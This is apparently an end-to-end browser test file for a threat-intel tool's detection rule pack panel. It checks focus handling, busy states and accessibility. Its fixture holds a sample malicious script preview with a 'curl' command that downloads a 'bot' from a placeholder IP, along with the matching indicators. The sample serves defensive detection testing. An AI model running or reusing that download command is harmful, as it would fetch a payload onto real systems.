"""End to end checks for the rule pack (Detections) panel behaviour.

These drive a real browser, so they are not part of the normal test run: the
package stays air gapped and ships no browser engine or Node toolchain, and
``pyproject.toml`` lists no browser dependency. Run this by hand when the
detections form or the busy and focus handling in ``dirsift.js`` changes.

What it covers (the client side of the rule pack):
  * changing any control (group tab, format, a type filter, the source or TLP
    select) keeps the keyboard's place: after the panel redraws, focus is on the
    same control, not thrown to the body and the top of the page
  * while the request is in flight the panel marks itself busy (aria-busy, a
    visible "Updating" line, the stale output dimmed), so the control that
    already moved and the output that has not do not read as a mismatch
  * a second change while a slow answer is still in flight wins: the last choice
    is the one that shows, not the first (hx-sync aborts the earlier request)
  * no page error and no console error in any of the above

How to run (Chromium, Firefox and WebKit; name one or more to run fewer):

    uv run --with playwright python tests/e2e/detections_e2e.py
    uv run --with playwright python tests/e2e/detections_e2e.py chromium
    uv run --with playwright playwright install chromium firefox webkit   # first time only

It starts its own server on 127.0.0.1:8813 against a throwaway run, so nothing
else needs to be up and no real target is touched. Exit code is 0 when every
check passes.
"""

from __future__ import annotations

import os
import socket
import sys
import tempfile
import threading
import time
from pathlib import Path

import uvicorn

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "src"))

from dirsift.models import Entry, Ioc, ScanResult  # noqa: E402
from dirsift.web import create_app  # noqa: E402

HOST = "127.0.0.1"
PORT = 8813
BASE = f"http://{HOST}:{PORT}"
ROOT = "http://127.0.0.1:8080/"
AXE_CDN = "https://cdnjs.cloudflare.com/ajax/libs/axe-core/4.14.0/axe.min.js"
WCAG = ["wcag2a", "wcag2aa", "wcag21a", "wcag21aa", "wcag22aa"]
WIDTHS = (280, 320, 414, 768, 1024, 1280, 1460)
BROWSERS = ("chromium", "firefox", "webkit")

# Flipped on only around the slow response check: the panel GET then waits on
# the server, which is steadier than holding the request from a route handler.
DELAY = {"on": False}


def build_runs(runs_dir: Path) -> None:
    """One run whose indicators fill several rule pack groups: SIEM hunts, block
    lists for more than one kind, and the SOAR / sharing exports."""
    script = Entry(
        url=ROOT + "install.sh",
        name="install.sh",
        depth=1,
        kind="script",
        confidence="sniffed",
        fetched_bytes=90,
        size=90,
        sha256="c" * 64,
        md5="d" * 32,
        text_preview="curl -o bot http://203.0.113.24/bot; ping panel.example",
    )
    result = ScanResult(
        root_url=ROOT,
        listing_flavor="python",
        entries=[script],
        iocs=[
            Ioc(
                ioc_type="url",
                value="http://203.0.113.24/bot",
                defanged="hxxp://203[.]0[.]113[.]24/bot",
                source_url=script.url,
            ),
            Ioc(
                ioc_type="ipv4",
                value="203.0.113.24",
                defanged="203[.]0[.]113[.]24",
                source_url=script.url,
            ),
            Ioc(
                ioc_type="domain",
                value="panel.example",
                defanged="panel[.]example",
                source_url=script.url,
            ),
        ],
    )
    (runs_dir / "pack.json").write_text(result.model_dump_json(), encoding="utf-8")


def wait_for_port() -> None:
    for _ in range(100):
        with socket.socket() as probe:
            if probe.connect_ex((HOST, PORT)) == 0:
                return
        time.sleep(0.1)
    raise RuntimeError("server did not come up")


class Checks:
    def __init__(self) -> None:
        self.failures: list[str] = []
        self.passes = 0

    def ok(self, label: str, condition: bool) -> None:
        if condition:
            self.passes += 1
            print(f"  pass  {label}")
        else:
            self.failures.append(label)
            print(f"  FAIL  {label}")


def watch_errors(page, errors: list[str]) -> None:
    """A request the panel cancels on purpose shows up as a cancelled network
    load: the earlier change when a newer one wins, and the preview under the
    panel when the panel is redrawn while that preview is still loading. Firefox
    words it as a NetworkError and WebKit as an access control failure. That is
    the design, not the page failing, so those lines are left out."""
    aborted = (
        "ERR_ABORTED", "aborted", "cancel", "NS_BINDING_ABORTED", "Load failed",
        "NetworkError when attempting to fetch", "due to access control checks",
    )

    def keep(text: str) -> bool:
        return not any(hint in text for hint in aborted)

    def console(msg) -> None:
        if msg.type == "error" and keep(msg.text):
            errors.append(f"console: {msg.text}")

    def pageerror(exc) -> None:
        if keep(str(exc)):
            errors.append(f"pageerror: {exc}")

    page.on("pageerror", pageerror)
    page.on("console", console)


def load_axe(page) -> None:
    if page.evaluate("() => !!window.axe"):
        return
    local = os.environ.get("DIRSIFT_AXE_JS")
    if local:
        page.add_script_tag(path=local)
    else:
        page.add_script_tag(url=AXE_CDN)
    page.wait_for_function("() => !!window.axe")


def axe_clean(page, label: str, checks: Checks) -> None:
    load_axe(page)
    result = page.evaluate(
        "async (tags) => await axe.run(document, {runOnly: {type: 'tag', values: tags}})",
        WCAG,
    )
    hits = [
        f"{v['id']} {v['nodes'][0]['target']}"
        for v in result["violations"]
        if v.get("impact") in ("serious", "critical")
    ]
    checks.ok(f"{label}: axe serious/critical is 0 {hits[:3]}", not hits)


def overflow_clean(page, label: str, checks: Checks) -> None:
    worst = []
    height = page.viewport_size["height"]
    for width in WIDTHS:
        page.set_viewport_size({"width": width, "height": height})
        page.wait_for_timeout(80)
        over = page.evaluate(
            "() => document.documentElement.scrollWidth"
            " - document.documentElement.clientWidth"
        )
        if over > 0:
            worst.append((width, over))
    page.set_viewport_size({"width": 1440, "height": height})
    checks.ok(f"{label}: no sideways scroll {worst}", not worst)


ACTIVE = """() => {
  const e = document.activeElement;
  if (!e || e === document.body) return null;
  return {id: e.id || '', name: e.getAttribute('name') || '',
          value: e.getAttribute('value') || '', tag: e.tagName};
}"""

def settled_focus(page):
    """The focused control once the redraw is done. htmx 4 ends the request just
    before it swaps, so the panel stops being busy a moment before focus comes
    back; wait for focus to land inside the panel, then read it."""
    try:
        page.wait_for_function(
            "() => { const e = document.activeElement;"
            " return e && e !== document.body && !!e.closest('#det-panel'); }",
            timeout=3000,
        )
    except Exception:
        return None
    return page.evaluate(ACTIVE)


CHECKED_GROUP = (
    "() => { const r = document.querySelector('[name=group]:checked');"
    " return r ? r.value : ''; }"
)
CHECKED_TARGET = (
    "() => { const r = document.querySelector('[name=target]:checked');"
    " return r ? r.value : ''; }"
)
BUSY = """() => { const p = document.getElementById('det-panel');
  return p ? {aria: p.getAttribute('aria-busy'), cls: p.classList.contains('is-busy')} : null; }"""


def open_pack(page) -> None:
    page.goto(f"{BASE}/runs/pack")
    page.wait_for_selector("[data-det-form]")


def other_group(page) -> str:
    """A group tab that is not the one checked now."""
    groups = page.eval_on_selector_all(
        "[name=group]", "els => els.map(e => e.value)"
    )
    now = page.evaluate(CHECKED_GROUP)
    for value in groups:
        if value != now:
            return value
    raise RuntimeError("the run has only one rule pack group; the fixture is wrong")


def focus_return_checks(page, tag: str, checks: Checks) -> None:
    open_pack(page)
    checks.ok(f"[{tag}] the fixture has at least two groups",
              len(page.query_selector_all("[name=group]")) >= 2)

    # A group tab, reached and toggled from the keyboard, keeps focus after the
    # redraw: the body never gets it.
    target_group = other_group(page)
    page.focus(f"[name=group][value='{target_group}']")
    page.keyboard.press("Space")
    page.wait_for_function(
        "g => document.querySelector('[name=group]:checked')"
        " && document.querySelector('[name=group]:checked').value === g"
        " && !document.getElementById('det-panel').classList.contains('is-busy')",
        arg=target_group,
    )
    here = settled_focus(page)
    checks.ok(f"[{tag}] group tab keeps focus after the redraw {here}",
              bool(here) and here["name"] == "group" and here["value"] == target_group)

    # A product radio in the open group: same thing.
    products = page.eval_on_selector_all("[name=target]", "els => els.map(e => e.value)")
    checked_target = page.evaluate(CHECKED_TARGET)
    pick = next((p for p in products if p != checked_target), None)
    if pick:
        page.focus(f"[name=target][value='{pick}']")
        page.keyboard.press("Space")
        page.wait_for_function(
            "t => document.querySelector('[name=target]:checked')"
            " && document.querySelector('[name=target]:checked').value === t"
            " && !document.getElementById('det-panel').classList.contains('is-busy')",
            arg=pick,
        )
        here = settled_focus(page)
        checks.ok(f"[{tag}] product radio keeps focus after the redraw {here}",
                  bool(here) and here["name"] == "target" and here["value"] == pick)

    # A filter checkbox keeps focus, found again by name and value. The
    # "leave out private and reserved" box is always present and enabled.
    page.focus("input[type=checkbox][name=exclude_private]")
    page.keyboard.press("Space")
    page.wait_for_function(
        "() => !document.getElementById('det-panel').classList.contains('is-busy')"
    )
    here = settled_focus(page)
    checks.ok(f"[{tag}] filter checkbox keeps focus after the redraw {here}",
              bool(here) and here["name"] == "exclude_private" and here["value"] == "true")

    # The TLP select keeps focus, found again by its stable id.
    tlps = page.eval_on_selector_all("#det-tlp option", "els => els.map(e => e.value)")
    now_tlp = page.eval_on_selector("#det-tlp", "el => el.value")
    other_tlp = next((t for t in tlps if t != now_tlp), None)
    if other_tlp:
        page.focus("#det-tlp")
        page.select_option("#det-tlp", other_tlp)
        page.wait_for_function(
            "() => !document.getElementById('det-panel').classList.contains('is-busy')"
        )
        here = settled_focus(page)
        checks.ok(f"[{tag}] TLP select keeps focus after the redraw {here}",
                  bool(here) and here["id"] == "det-tlp")


def busy_and_last_wins_checks(page, tag: str, checks: Checks) -> None:
    # The panel GET is slowed on the server (DELAY, set by main's middleware) so
    # the in flight state is there long enough to see; the preview under it is
    # never slowed. A sync route handler cannot hold a request reliably, so the
    # wait is put on the server instead of in the browser.
    DELAY["on"] = True
    try:
        open_pack(page)
        first = other_group(page)
        page.focus(f"[name=group][value='{first}']")
        page.keyboard.press("Space")
        # While the slow answer is pending the panel reads as busy.
        page.wait_for_function(
            "() => { const p = document.getElementById('det-panel');"
            " return p && p.getAttribute('aria-busy') === 'true'"
            " && p.classList.contains('is-busy'); }"
        )
        busy = page.evaluate(BUSY)
        checks.ok(f"[{tag}] the panel marks itself busy while fetching {busy}",
                  bool(busy) and busy["aria"] == "true" and busy["cls"])
        # The dimming eases in over a short transition, so wait for it.
        dimmed = page.wait_for_function(
            "() => { const o = document.querySelector('#det-panel .rule-out');"
            " return o ? parseFloat(getComputedStyle(o).opacity) < 0.9 : true; }"
        )
        checks.ok(f"[{tag}] the stale output is dimmed while fetching", dimmed)
        updating = page.wait_for_function(
            "() => { const n = document.querySelector('#det-panel [data-det-busy]');"
            " return n && getComputedStyle(n).display !== 'none'; }"
        )
        checks.ok(f"[{tag}] a visible updating line shows while fetching", bool(updating))
        # The screen reader hears it once, after the short wait (the 300 ms
        # debounce), through the polite region the script adds to the page.
        spoke = page.wait_for_function(
            "() => Array.prototype.some.call("
            "document.querySelectorAll('[role=status]'),"
            " n => /Updating the rules/.test(n.textContent))"
        )
        checks.ok(f"[{tag}] the loading state is announced politely", bool(spoke))

        # A second, different choice made before the first answer returns is the
        # one that wins: the panel settles on it, not on the first.
        groups = page.eval_on_selector_all("[name=group]", "els => els.map(e => e.value)")
        now = page.evaluate(CHECKED_GROUP)
        second = next((g for g in groups if g not in (first, now)), now)
        page.focus(f"[name=group][value='{second}']")
        page.keyboard.press("Space")
        page.wait_for_function(
            "g => document.querySelector('[name=group]:checked')"
            " && document.querySelector('[name=group]:checked').value === g"
            " && !document.getElementById('det-panel').classList.contains('is-busy')",
            arg=second,
            timeout=8000,
        )
        settled_group = page.evaluate(CHECKED_GROUP)
        settled_target = page.evaluate(CHECKED_TARGET)
        target_in_group = page.evaluate(
            "t => !!document.querySelector('[name=target][value=\"' + t + '\"]:checked')",
            settled_target,
        )
        checks.ok(
            f"[{tag}] the last choice wins (group {settled_group}, target {settled_target})",
            settled_group == second and target_in_group,
        )
    finally:
        DELAY["on"] = False


def run_browser(pw, engine: str, checks: Checks) -> None:
    browser = getattr(pw, engine).launch()
    errors: list[str] = []
    context = browser.new_context(viewport={"width": 1440, "height": 900})
    page = context.new_page()
    watch_errors(page, errors)
    print(f"{engine} wide (1440x900):")
    focus_return_checks(page, engine, checks)
    busy_and_last_wins_checks(page, engine, checks)
    if engine == "chromium":
        open_pack(page)
        axe_clean(page, f"[{engine}] rule pack", checks)
        overflow_clean(page, f"[{engine}] rule pack", checks)
    context.close()
    browser.close()
    checks.ok(f"[{engine}] no page or console error {errors[:3]}", errors == [])


def main() -> int:
    engines = [name for name in sys.argv[1:] if name in BROWSERS] or list(BROWSERS)
    tmp = Path(tempfile.mkdtemp(prefix="dirsift-detections-e2e-"))
    build_runs(tmp)
    app = create_app(tmp)

    import anyio
    from starlette.middleware.base import BaseHTTPMiddleware

    class SlowPanel(BaseHTTPMiddleware):
        async def dispatch(self, request, call_next):
            if DELAY["on"] and request.url.path == "/runs/pack/detections":
                await anyio.sleep(0.7)
            return await call_next(request)

    app.add_middleware(SlowPanel)
    config = uvicorn.Config(app, host=HOST, port=PORT, log_level="warning")
    server = uvicorn.Server(config)
    thread = threading.Thread(target=server.run, daemon=True)
    thread.start()
    wait_for_port()

    checks = Checks()
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("playwright is not installed. See the header of this file for how to run it.")
        return 2

    with sync_playwright() as pw:
        for engine in engines:
            run_browser(pw, engine, checks)

    server.should_exit = True
    print(f"\n{checks.passes} passed, {len(checks.failures)} failed")
    for label in checks.failures:
        print(f"  FAIL  {label}")
    return 1 if checks.failures else 0


if __name__ == "__main__":
    raise SystemExit(main())
